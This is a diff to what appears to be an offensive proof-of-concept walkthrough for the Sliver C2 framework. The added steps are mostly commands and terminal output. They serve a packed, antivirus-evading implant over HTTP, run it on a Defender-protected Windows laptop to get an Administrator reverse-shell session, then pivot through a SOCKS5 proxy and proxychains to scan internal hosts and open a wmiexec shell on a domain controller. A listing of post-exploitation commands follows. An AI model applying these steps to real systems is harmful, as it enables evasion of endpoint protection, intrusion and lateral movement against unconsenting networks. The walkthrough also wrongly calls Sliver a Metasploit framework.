@@ -316,13 +316,20 @@ Sub Commands:
 [*] Build completed in 2m6s
 [*] Implant saved to /home/jeff/Documents/Tools/SLiver-C2/SliverRevShell.exe
 
+jeff@kali:~/Documents/Tools/SLiver-C2$ sudo chmod 777 SliverRevShell1.exe 
 
 ====================================================================================================================================================
 PoC - Step 5 - Generate a packed version of the SLIVER implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
 ====================================================================================================================================================
 
-Our packed version of the SLIVER implant is using obfuscation, encryption and compression techniques, direct syscalls (etc...) to avoid AV detection.
-Note: Compression is very important beacause the SLIVER implant generated is huge (around 18 Mo)
+jeff@kali:~/Documents/Tools/SLiver-C2$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+192.168.56.1 - - [02/Jan/2023 06:35:49] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [02/Jan/2023 06:35:50] "GET /Packed-SliverRevShell.exe HTTP/1.1" 200 -
+
+
+Our packed version of the SLIVER implant is using obfuscation, encryption and compression techniques, direct syscalls (etc...) to avoid AV detection (MS Defender AV).
+Note: Compression is very important beacause the original SLIVER implant that we generated was very big (i.e. around 18 Mo) => our packed version is 'only' 5 Mo (compression ratio = 29%).
 
 C:\temp> dir 
  Volume in drive C is Windows
@@ -333,9 +340,301 @@ C:\temp> dir
 02/01/2023  04:00    <DIR>          .
 02/01/2023  04:00    <DIR>          ..
 23/12/2022  00:51         5,407,744 Packed-SliverRevShell.exe
-31/12/2022  06:51        18,218,496 SliverRevShell.exe
-               2 File(s)     23,626,240 bytes
-               2 Dir(s)  93,179,334,656 bytes free
+<SNIP>
+
+C:\temp> Packed-SliverRevShell.exe
+
+
+====================================================================================================================================================
+PoC - Step 6 - Get the reverse shell and then configure the SLIVER handler (C2 server) to be able to pivot into the internal network (192.168.1.0/24)
+               using a proxy 'socks5' (command 'socks5 start' to run in the SLIVER session) and Proxychains
+====================================================================================================================================================
+
+[server] sliver > jobs
+
+ ID   Name    Protocol   Port 
+==== ======= ========== ======
+ 1    https   tcp        443  
+
+
+[*] Session 12d24a56 BOILING_LIVER - 192.168.1.113:14737 (Laptop1) - windows/amd64 - Sat, 31 Dec 2022 01:02:21 CET
+
+
+[server] sliver > sessions
+
+ ID         Transport   Remote Address        Hostname   Username        Operating System   Health  
+========== =========== ===================== ========== =============== ================== =========
+ 12d24a56   http(s)     192.168.1.113:14737   Laptop1   Administrator   windows/amd64      [ALIVE] 
+
+
+[server] sliver > sessions -i 12d24a56
+
+[*] Active session BOILING_LIVER (12d24a56)
+
+
+[server] sliver (BOILING_LIVER) > getuid
+
+S-1-5-21-936125016-2310263949-2175806047-500
+
+
+[server] sliver (BOILING_LIVER) > socks5 start
+
+[*] Started SOCKS5 127.0.0.1 1081  
+âš   In-band SOCKS proxies can be a little unstable depending on protocol
+
+
+------------------------------------------------------------------
+Notes
+# apt-get install proxychains
+# cp /etc/proxychains.conf /etc/proxychains.conf.backup
+# echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf
+------------------------------------------------------------------
+
+jeff@kali:~$ tail /etc/proxychains.conf 
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4  127.0.0.1 9050
+# socks5  127.0.0.1 1080
+socks5  127.0.0.1 1081
+
                
-               
-               
+============================================================================================================================================
+PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the SLIVER session to pivot into the network '192.168.1.0/24'
+============================================================================================================================================
+
+
+without using Proxychains and the SLIVER tunnel the network connection are filtered towards the Windows machines '192.168.1.113' and '192.168.1.167' from the Kali VM 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/SLiver-C2$ nmap -Pn -sT -p 3389 192.168.1.113,167
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-02 01:05 CET
+Nmap scan report for 192.168.1.113
+Host is up (0.0000060s latency).
+
+PORT     STATE    SERVICE
+3389/tcp filtered ms-wbt-server
+
+Nmap scan report for 192.168.1.167
+Host is up (0.000025s latency).
+
+PORT     STATE    SERVICE
+3389/tcp filtered ms-wbt-server
+
+Nmap done: 2 IP addresses (2 hosts up) scanned in 13.09 seconds
+
+
+Example 1 - Nmap port scan of the Windows machines '192.168.1.113' and '192.168.1.167' over the SLIVER tunnel
+---------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/SLiver-C2$ proxychains nmap -Pn -sT -p 3389 192.168.1.113,167
+ProxyChains-3.1 (http://proxychains.sf.net)
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-02 01:07 CET
+|S-chain|-<>-127.0.0.1:1081-<><>-192.168.1.167:3389-<><>-OK
+|S-chain|-<>-127.0.0.1:1081-<><>-192.168.1.113:3389-<><>-OK
+Nmap scan report for 192.168.1.113
+Host is up (0.044s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+
+Nmap scan report for 192.168.1.167
+Host is up (0.025s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+
+Nmap done: 2 IP addresses (2 hosts up) scanned in 13.14 seconds
+
+
+Example 2 - WMIexec (impacket) connection to the Windows DC 2016 (192.168.13.167) from the Kali linux over the SLIVER tunnel
+-----------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/SLiver-C2$ proxychains impacket-wmiexec company.work/chuck.norris.adm@192.168.1.167
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
+
+Password:
+|S-chain|-<>-127.0.0.1:1081-<><>-192.168.1.167:445-<><>-OK
+[*] SMBv3.0 dialect used
+|S-chain|-<>-127.0.0.1:1081-<><>-192.168.1.167:135-<><>-OK
+|S-chain|-<>-127.0.0.1:1081-<><>-192.168.1.167:49666-<><>-OK
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>hostname
+DC1
+
+C:\>whoami
+company\chuck.norris.adm
+
+C:\>exit
+
+
+============================================================================================================================================
+Other - Post-exploitation modules 
+============================================================================================================================================
+
+There are many post-exploitation modules available with the Metasploit C2 framework.
+
+Below are some examples of post-exploitation commands and modules:
+
+[server] sliver (BOILING_LIVER) > help
+
+Commands:
+=========
+  clear       clear the screen
+  exit        exit the shell
+  help        use 'help [command]' for command help
+  monitor     Monitor threat intel platforms for Sliver implants
+  wg-config   Generate a new WireGuard client config
+  wg-portfwd  List ports forwarded by the WireGuard tun interface
+  wg-socks    List socks servers listening on the WireGuard tun interface
+
+Generic:
+========
+  aliases           List current aliases
+  armory            Automatically download and install extensions/aliases
+  background        Background an active session
+  beacons           Manage beacons
+  builders          List external builders
+  canaries          List previously generated canaries
+  cursed            Chrome/electron post-exploitation tool kit (âˆ©ï½€-Â´)âŠƒâ”â˜†ï¾Ÿ.*ï½¥ï½¡ï¾Ÿ
+  dns               Start a DNS listener
+  env               List environment variables
+  generate          Generate an implant binary
+  hosts             Manage the database of hosts
+  http              Start an HTTP listener
+  https             Start an HTTPS listener
+  implants          List implant builds
+  jobs              Job control
+  licenses          Open source licenses
+  loot              Manage the server's loot store
+  mtls              Start an mTLS listener
+  prelude-operator  Manage connection to Prelude's Operator
+  profiles          List existing profiles
+  reaction          Manage automatic reactions to events
+  regenerate        Regenerate an implant
+  sessions          Session management
+  settings          Manage client settings
+  stage-listener    Start a stager listener
+  tasks             Beacon task management
+  update            Check for updates
+  use               Switch the active session or beacon
+  version           Display version information
+  websites          Host static content (used with HTTP C2)
+  wg                Start a WireGuard listener
+
+Multiplayer:
+============
+  kick-operator  Kick an operator from the server
+  multiplayer    Enable multiplayer mode
+  new-operator   Create a new operator config file
+  operators      Manage operators
+
+Sliver - Windows:
+=================
+  backdoor          Infect a remote file with a sliver shellcode
+  dllhijack         Plant a DLL for a hijack scenario
+  execute-assembly  Loads and executes a .NET assembly in a child process (Windows Only)
+  getprivs          Get current privileges (Windows only)
+  getsystem         Spawns a new sliver session as the NT AUTHORITY\SYSTEM user (Windows Only)
+  impersonate       Impersonate a logged in user.
+  make-token        Create a new Logon Session with the specified credentials
+  migrate           Migrate into a remote process
+  psexec            Start a sliver service on a remote target
+  registry          Windows registry operations
+  rev2self          Revert to self: lose stolen Windows token
+  runas             Run a new process in the context of the designated user (Windows Only)
+  spawndll          Load and execute a Reflective DLL in a remote process
+
+Sliver:
+=======
+  cat                Dump file to stdout
+  cd                 Change directory
+  close              Close an interactive session without killing the remote process
+  download           Download a file
+  execute            Execute a program on the remote system
+  execute-shellcode  Executes the given shellcode in the sliver process
+  extensions         Manage extensions
+  getgid             Get session process GID
+  getpid             Get session pid
+  getuid             Get session process UID
+  ifconfig           View network interface configurations
+  info               Get info about session
+  interactive        Task a beacon to open an interactive session (Beacon only)
+  kill               Kill a session
+  ls                 List current directory
+  mkdir              Make a directory
+  msf                Execute an MSF payload in the current process
+  msf-inject         Inject an MSF payload into a process
+  mv                 Move or rename a file
+  netstat            Print network connection information
+  ping               Send round trip message to implant (does not use ICMP)
+  pivots             List pivots for active session
+  portfwd            In-band TCP port forwarding
+  procdump           Dump process memory
+  ps                 List remote processes
+  pwd                Print working directory
+  reconfig           Reconfigure the active beacon/session
+  rename             Rename the active beacon/session
+  rm                 Remove a file or directory
+  rportfwd           reverse port forwardings
+  screenshot         Take a screenshot
+  shell              Start an interactive shell
+  shikata-ga-nai     Polymorphic binary shellcode encoder (ãƒŽ ã‚œÐ”ã‚œ)ãƒŽ ï¸µ ä»•æ–¹ãŒãªã„
+  sideload           Load and execute a shared object (shared library/DLL) in a remote process
+  socks5             In-band SOCKS5 Proxy
+  ssh                Run a SSH command on a remote host
+  terminate          Terminate a process on the remote system
+  upload             Upload a file
+  whoami             Get session user execution context
+
+
+For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki
+
+
+server] sliver (BOILING_LIVER) > background
+
+[*] Background ...
+
+[server] sliver > sessions
+
+ ID         Transport   Remote Address        Hostname   Username        Operating System   Health  
+========== =========== ===================== ========== =============== ================== =========
+ 12d24a56   http(s)     192.168.1.113:14737   Laptop1   Administrator   windows/amd64      [ALIVE] 
+
+
+[server] sliver >  sessions -i  12d24a56
+
+[*] Active session BOILING_LIVER (12d24a56)
+
+
+[server] sliver (BOILING_LIVER) > whoami
+
+Logon ID: Laptop1\Administrator
+[*] Current Token ID: Laptop1\Administrator
+
+
+[server] sliver (BOILING_LIVER) > getprivs
+
+Privilege Information for Packed-SliverRevShell.exe (PID: 6232)
+----------------------------------------------------------------
+
+Process Integrity Level: High
+
+Name                                            Description                                                             Attributes
+====                                            ===========                                                             ==========
+SeLockMemoryPrivilege                           Lock pages in memory                                                    Disabled
+SeIncreaseQuotaPrivilege                        Adjust memory quotas for a process                                      Disabled
+SeSecurityPrivilege                             Manage auditing and security log                                        Disabled
+SeTakeOwnershipPrivilege                        Take ownership of files or other objects                                Disabled
+SeLoadDriverPrivilege                           Load and unload device drivers                                          Disabled
+SeSystemProfilePrivilege                        Profile system performance                                              Disabled
+<SNIP>
+
